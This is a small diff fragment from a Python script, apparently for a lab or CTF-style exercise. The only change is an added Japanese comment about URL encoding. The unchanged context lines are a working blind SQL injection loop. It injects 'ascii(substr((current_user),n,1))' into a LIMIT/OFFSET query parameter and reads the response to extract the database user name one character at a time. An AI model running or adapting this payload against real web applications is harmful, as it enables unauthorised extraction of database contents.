@@ -13,6 +13,7 @@ with open('tweet_ids.txt', 'r') as f:
 
 for i in range(200):
     attack = 'ascii(substr((current_user),' + str(i+1) + ',1))'
+    # quote:urlエンコード
     url = base_url + '?search=&limit=1+offset+' + urllib.parse.quote(attack)
     res = requests.get(url)
     tweet_id = res.text.split(split_s)[1].split(split_e)[0]
